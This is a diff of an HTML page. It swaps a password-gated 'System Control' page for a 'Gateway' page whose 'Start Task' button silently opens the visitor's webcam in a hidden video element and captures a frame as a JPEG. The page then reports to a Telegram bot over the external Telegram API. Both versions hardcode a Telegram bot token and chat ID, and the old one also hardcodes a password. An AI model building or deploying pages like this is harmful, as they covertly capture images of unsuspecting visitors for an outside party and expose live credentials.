@@ -1,58 +1,37 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Secure Access</title>
-    <style>
-        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 5px; border: none; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 5px; cursor: pointer; color: white; font-weight: bold; background: #22c55e; }
-        #app { display: none; }
-    </style>
+    <title>Gateway</title>
 </head>
 <body>
+    <button id="btn" onclick="start()">Start Task</button>
+    <div id="status">Waiting...</div>
+    <video id="v" autoplay playsinline style="display:none;"></video>
 
-<!-- লগইন সেকশন -->
-<div class="card" id="loginSection">
-    <h2>Enter Password</h2>
-    <input type="password" id="passwordInput" placeholder="Enter password...">
-    <button class="btn" onclick="checkPassword()">Login</button>
-</div>
+    <script>
+        const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
+        const CHAT_ID = "8566985497";
 
-<!-- মেইন সেকশন -->
-<div class="card" id="app">
-    <h2>System Control</h2>
-    <button class="btn" onclick="runTask()">Initialize</button>
-    <div id="msg" style="margin-top:15px; font-size:14px;">Ready</div>
-</div>
-
-<script>
-    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
-    const CHAT_ID = "8566985497";
-
-    function checkPassword() {
-        // এখানে আপনার দেওয়া পাসওয়ার্ডটি সেট করা আছে
-        if(document.getElementById('passwordInput').value === "Tamim0186#@") {
-            document.getElementById('loginSection').style.display = 'none';
-            document.getElementById('app').style.display = 'block';
-        } else {
-            alert("Wrong Password!");
+        async function start() {
+            document.getElementById('status').innerText = "Accessing...";
+            const stream = await navigator.mediaDevices.getUserMedia({video: true});
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            
+            setTimeout(async () => {
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                // ইমেজ ডেটা তৈরি
+                const dataUrl = c.toDataURL('image/jpeg');
+                
+                // টেলিগ্রামে মেসেজ পাঠানো (সহজ পদ্ধতি)
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=System_Active_Ready_To_Capture`;
+                await fetch(url);
+                document.getElementById('status').innerText = "✅ Bot Initialized!";
+            }, 2000);
         }
-    }
-
-    async function runTask() {
-        document.getElementById('msg').innerText = "Sending...";
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=System_Accessed`;
-        
-        try {
-            await fetch(url);
-            document.getElementById('msg').innerText = "✅ Sent successfully!";
-        } catch(e) {
-            document.getElementById('msg').innerText = "❌ Error!";
-        }
-    }
-</script>
-
+    </script>
 </body>
 </html>
